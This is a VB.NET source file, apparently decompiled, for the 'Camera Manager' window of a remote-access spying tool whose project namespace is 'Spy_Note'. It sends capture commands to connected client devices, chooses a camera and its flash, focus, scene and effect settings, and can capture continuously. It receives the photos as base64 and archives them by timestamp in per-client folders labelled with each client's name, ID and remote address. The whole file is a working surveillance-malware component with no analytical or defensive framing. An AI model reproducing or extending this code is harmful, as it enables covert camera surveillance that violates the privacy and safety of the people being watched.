Imports System.ComponentModel
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.CompilerServices
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Camera_Manager
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Private c As PictureBox
    Private l As Integer
    Private bo As Boolean
    Private int As Integer
    Private nextlop As Integer
    Public Sub New()
        Me.c = New PictureBox()
        Me.l = 1
        Me.bo = False
        Me.int = -36
        Me.nextlop = 0
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String, Camera As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim visible As Boolean = Me.Label4.Visible
                    If visible Then
                        Me.Label4.Visible = False
                    End If
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                    Dim checked As Boolean = Me.CheckBox1.Checked
                    If checked Then
                        Me.CheckBox1.Checked = False
                        Dim flag4 As Boolean = Operators.CompareString(Me.Button1.Text, "stop", False) = 0
                        If flag4 Then
                            Me.Button1.Text = "start"
                        End If
                    End If
                Else
                    Dim flag5 As Boolean = Operators.CompareString(Camera, "IFoundCamera", False) = 0
                    If flag5 Then
                        Me.ComboBox1.Items.Clear()
                        Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                        Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                        Dim num As Integer = array2.Length - 1
                        For i As Integer = 0 To num
                            Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                            Dim array3 As String() = array2(i).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                            Me.ComboBox1.Items.Add(array3(0) + Strings.Space(1) + array3(1))
                        Next
                        Dim flag6 As Boolean = Me.ComboBox1.Items.Count > 0
                        If flag6 Then
                            Me.ComboBox1.Text = Conversions.ToString(Me.ComboBox1.Items(0))
                        End If
                    Else
                        Dim flag7 As Boolean = Operators.CompareString(Camera, "ITookPicture", False) = 0
                        If flag7 Then
                            Dim flag8 As Boolean = Me.CheckBox1.Checked And Operators.CompareString(Me.Button1.Text, "stop", False) = 0
                            If flag8 Then
                                Me.cap()
                            End If
                            Dim buffer As Byte() = Convert.FromBase64String(data)
                            Dim stream As MemoryStream = New MemoryStream(buffer)
                            Dim image As Image = Image.FromStream(stream)
                            Me.c.Image = image
                            Dim flag9 As Boolean = Me.l > 1
                            If flag9 Then
                                Dim num2 As Integer = Me.l
                                For j As Integer = 2 To num2
                                    Me.rot(j)
                                Next
                            End If
                            Me.PictureBox1.Image = Me.c.Image
                            Dim text As String = String.Concat(New String() {Application.StartupPath, "\", store_0.name_folder_app_resource, "\Folder_Clients\", Me.Name_Client, Me.Client_ID, "\Camera_Manager"})
                            Dim flag10 As Boolean = Not My.Computer.FileSystem.DirectoryExists(text)
                            If flag10 Then
                                My.Computer.FileSystem.CreateDirectory(text)
                            End If
                            Dim arg As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                            Dim str As String = String.Format("{0:1}", arg, Nothing)
                            image.Save(text + "\" + str + ".Jpeg", ImageFormat.Jpeg)
                        End If
                    End If
                    Dim visible2 As Boolean = Me.Label4.Visible
                    If visible2 Then
                        Me.Label4.Visible = False
                    End If
                    Dim visible3 As Boolean = Me.Panel3.Visible
                    If visible3 Then
                        Me.Panel3.Visible = False
                    End If
                End If
                Me.refres_title()
                Dim flag11 As Boolean = Me.ComboBox1.Items.Count <= 0
                If flag11 Then
                    Me.Panel1.Enabled = False
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Camera Manager - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text
    End Sub

    Private Sub Camera_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SceneModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_scene")
        Me.EffectsToolStripMenuItem.Image = store_0.Bitmap_0("ctx_effects")
        Me.FlashModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_flash")
        Me.FocusModeToolStripMenuItem.Image = store_0.Bitmap_0("ctx_foces")
        Me.Panel2.Location = New Point(-70, 44)
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Me.Label4.Parent = Me.PictureBox1
        Me.Label4.BackColor = Color.Transparent
        Me.Label4.BringToFront()
        Me.L1.Image = store_0.Bitmap_0("Rotate180")
        Me.PictureBox2.Image = store_0.Bitmap_0("ri_arr")
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Function SetParameters() As String
        Dim text As String = Nothing
        Try
            For Each obj As Object In Me.FlashModeToolStripMenuItem.DropDown.Items
                Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
                Dim flag As Boolean = Conversions.ToBoolean(NewLateBinding.LateGet(objectValue, Nothing, "Checked", New Object(-1) {}, Nothing, Nothing, Nothing))
                If flag Then
                    text += "1"
                Else
                    text += "0"
                End If
            Next
        Finally
        End Try
        Try
            For Each obj2 As Object In Me.FocusModeToolStripMenuItem.DropDown.Items
                Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(obj2)
                Dim flag2 As Boolean = Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, Nothing, "Checked", New Object(-1) {}, Nothing, Nothing, Nothing))
                If flag2 Then
                    text += "1"
                Else
                    text += "0"
                End If
            Next
        Finally
        End Try
        Try
            For Each obj3 As Object In Me.SceneModeToolStripMenuItem.DropDown.Items
                Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(obj3)
                Dim flag3 As Boolean = Conversions.ToBoolean(NewLateBinding.LateGet(objectValue3, Nothing, "Checked", New Object(-1) {}, Nothing, Nothing, Nothing))
                If flag3 Then
                    text += "1"
                Else
                    text += "0"
                End If
            Next
        Finally
        End Try
        Try
            For Each obj4 As Object In Me.EffectsToolStripMenuItem.DropDown.Items
                Dim objectValue4 As Object = RuntimeHelpers.GetObjectValue(obj4)
                Dim flag4 As Boolean = Conversions.ToBoolean(NewLateBinding.LateGet(objectValue4, Nothing, "Checked", New Object(-1) {}, Nothing, Nothing, Nothing))
                If flag4 Then
                    text += "1"
                Else
                    text += "0"
                End If
            Next
        Finally
        End Try
        Return text
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "stop", False) = 0
        If flag Then
            Dim checked As Boolean = Me.CheckBox1.Checked
            If checked Then
                Me.Button1.Text = "start"
            Else
                Me.Button1.Text = "Capture"
            End If
        Else
            Dim flag2 As Boolean = Operators.CompareString(Me.Button1.Text, "start", False) = 0
            If flag2 Then
                Me.Button1.Text = "stop"
            End If
        End If
        Me.cap()
    End Sub
    Private Sub cap()
        Dim text As String = Me.ComboBox1.Text
        Dim text2 As String = Me.ComboBox2.Text
        Dim flag As Boolean = Operators.CompareString(text, Nothing, False) <> 0 And Operators.CompareString(text2, Nothing, False) <> 0
        If flag Then
            Dim flag2 As Boolean = text.Contains("Camera") And text2.Contains("%")
            If flag2 Then
                Dim separator As String() = New String() {"Camera"}
                Dim array As String() = text.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Dim text3 As String = array(1).Trim()
                Dim separator2 As String() = New String() {"%"}
                Dim array2 As String() = text2.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                Dim text4 As String = array2(0).Trim()
                Dim flag3 As Boolean = Not Me.Label4.Visible
                If flag3 Then
                    Me.Label4.Visible = True
                End If
                My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"camera_manager_capture", My.Forms.Form1.s.SplitData, text3, My.Forms.Form1.s.SplitData, text4, My.Forms.Form1.s.SplitData, Me.SetParameters()}))
            End If
        End If
    End Sub

    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub
    Private Sub ComboBox2_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox2.KeyPress
        e.Handled = True
    End Sub

    Private Sub AutoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem.Click
        Me.AutoToolStripMenuItem.Checked = True
        Me.ONToolStripMenuItem.Checked = False
        Me.OFFToolStripMenuItem.Checked = False
    End Sub

    Private Sub ONToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ONToolStripMenuItem.Click
        Me.ONToolStripMenuItem.Checked = True
        Me.AutoToolStripMenuItem.Checked = False
        Me.OFFToolStripMenuItem.Checked = False
    End Sub

    Private Sub OFFToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OFFToolStripMenuItem.Click
        Me.OFFToolStripMenuItem.Checked = True
        Me.ONToolStripMenuItem.Checked = False
        Me.AutoToolStripMenuItem.Checked = False
    End Sub

    Private Sub AutoToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem.Click
        Me.AutoToolStripMenuItem.Checked = True
        Me.EdofToolStripMenuItem.Checked = False
        Me.FixedToolStripMenuItem.Checked = False
    End Sub
    Private Sub EdofToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EdofToolStripMenuItem.Click
        Me.EdofToolStripMenuItem.Checked = True
        Me.AutoToolStripMenuItem1.Checked = False
        Me.FixedToolStripMenuItem.Checked = False
    End Sub

    Private Sub FixedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FixedToolStripMenuItem.Click
        Me.FixedToolStripMenuItem.Checked = True
        Me.EdofToolStripMenuItem.Checked = False
        Me.AutoToolStripMenuItem1.Checked = False
    End Sub

    Private Sub AutoToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles AutoToolStripMenuItem2.Click
        Me.AutoToolStripMenuItem2.Checked = True
        Me.NightToolStripMenuItem.Checked = False
        Me.SportsToolStripMenuItem.Checked = False
        Me.PartyToolStripMenuItem.Checked = False
    End Sub

    Private Sub NightToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NightToolStripMenuItem.Click
        Me.NightToolStripMenuItem.Checked = True
        Me.AutoToolStripMenuItem2.Checked = False
        Me.SportsToolStripMenuItem.Checked = False
        Me.PartyToolStripMenuItem.Checked = False
    End Sub

    Private Sub SportsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SportsToolStripMenuItem.Click
        Me.SportsToolStripMenuItem.Checked = True
        Me.NightToolStripMenuItem.Checked = False
        Me.AutoToolStripMenuItem2.Checked = False
        Me.PartyToolStripMenuItem.Checked = False
    End Sub

    Private Sub PartyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PartyToolStripMenuItem.Click
        Me.PartyToolStripMenuItem.Checked = True
        Me.SportsToolStripMenuItem.Checked = False
        Me.NightToolStripMenuItem.Checked = False
        Me.AutoToolStripMenuItem2.Checked = False
    End Sub

    Private Sub EFFECTNONEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTNONEToolStripMenuItem.Click
        Me.EFFECTNONEToolStripMenuItem.Checked = True
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTNEGATIVEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTNEGATIVEToolStripMenuItem.Click
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = True
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTAQUAToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTAQUAToolStripMenuItem.Click
        Me.EFFECTAQUAToolStripMenuItem.Checked = True
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTBLACKBOARDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTBLACKBOARDToolStripMenuItem.Click
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = True
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTMONOToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTMONOToolStripMenuItem.Click
        Me.EFFECTMONOToolStripMenuItem.Checked = True
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTPOSTERIZEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTPOSTERIZEToolStripMenuItem.Click
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = True
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTSEPIAToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTSEPIAToolStripMenuItem.Click
        Me.EFFECTSEPIAToolStripMenuItem.Checked = True
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = False
    End Sub

    Private Sub EFFECTWHITEBOARDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EFFECTWHITEBOARDToolStripMenuItem.Click
        Me.EFFECTWHITEBOARDToolStripMenuItem.Checked = True
        Me.EFFECTSEPIAToolStripMenuItem.Checked = False
        Me.EFFECTPOSTERIZEToolStripMenuItem.Checked = False
        Me.EFFECTMONOToolStripMenuItem.Checked = False
        Me.EFFECTBLACKBOARDToolStripMenuItem.Checked = False
        Me.EFFECTAQUAToolStripMenuItem.Checked = False
        Me.EFFECTNEGATIVEToolStripMenuItem.Checked = False
        Me.EFFECTNONEToolStripMenuItem.Checked = False
    End Sub
    Private Sub rot(A As Integer)
        Select Case A
            Case 2
                Me.c.Image.RotateFlip(RotateFlipType.Rotate90FlipX)
            Case 3
                Me.c.Image.RotateFlip(RotateFlipType.Rotate270FlipX)
            Case 4
                Me.c.Image.RotateFlip(RotateFlipType.Rotate90FlipX)
            Case 5
                Me.c.Image.RotateFlip(RotateFlipType.Rotate270FlipX)
                Me.l = 1
        End Select
        Me.c.Refresh()
        Me.PictureBox1.Image = Me.c.Image
    End Sub

    Private Sub Camera_Manager_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "camera_manager_stop")
    End Sub
    Private Sub arr()
        Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(Me.PictureBox2.Tag, "On", False)
        If flag Then
            Me.bo = True
            Me.Panel2.Location = New Point(3, 44)
            Me.PictureBox2.Tag = "off"
            Me.PictureBox2.Image = store_0.Bitmap_0("li_arr")
        Else
            Me.bo = False
            Me.Panel2.Location = New Point(-35, 44)
            Me.PictureBox2.Tag = "On"
            Me.PictureBox2.Image = store_0.Bitmap_0("ri_arr")
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        Dim checked As Boolean = Me.CheckBox1.Checked
        If checked Then
            Me.Button1.Text = "start"
        Else
            Me.Button1.Text = "Capture"
        End If
    End Sub
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        Dim flag As Boolean = e.X < 20
        If flag Then
            Dim flag2 As Boolean = Not Me.bo
            If flag2 Then
                Dim enabled As Boolean = Me.Timer1.Enabled
                If enabled Then
                    Me.Timer1.Enabled = False
                End If
                Dim flag3 As Boolean = Me.int <> -36
                If flag3 Then
                    Me.int = -36
                End If
                Dim flag4 As Boolean = Me.nextlop <> 0
                If flag4 Then
                    Me.nextlop = 0
                End If
                Me.arr()
            End If
        Else
            Dim flag5 As Boolean = Me.bo
            If flag5 Then
                Me.arr()
                Me.Timer1.Enabled = True
            End If
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.nextlop += 1
        Dim flag As Boolean = Me.nextlop > 30
        If flag Then
            Dim flag2 As Boolean = Me.int >= -70
            If flag2 Then
                Me.Panel2.Location = New Point(Me.int, 44)
                Me.int -= 1
            Else
                Me.int = -36
                Me.nextlop = 0
                Me.Timer1.Enabled = False
            End If
        Else
            Me.Panel2.Location = New Point(-36, 44)
        End If
    End Sub
    Private Sub L1_Click(sender As Object, e As EventArgs) Handles L1.Click
        Dim flag As Boolean = Me.PictureBox1.Image IsNot Nothing
        If flag Then
            Me.l += 1
            Me.rot(Me.l)
        End If
    End Sub
End Class